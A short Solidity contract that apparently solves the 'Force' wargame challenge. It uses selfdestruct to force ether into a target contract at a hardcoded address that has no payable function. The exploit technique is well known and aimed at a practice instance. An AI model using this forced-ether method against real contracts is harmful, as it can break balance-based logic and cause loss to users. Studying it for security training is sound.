pragma solidity ^0.4.18;

contract Force {}

contract hack{
    address instance_address = 0xfAFE92b7a0Ad04C8789fa2f60ea804264D8Fd369;
    Force target = Force(instance_address);

    function hack() payable {}

    function exploit() payable public {
        selfdestruct(target);
    }
}
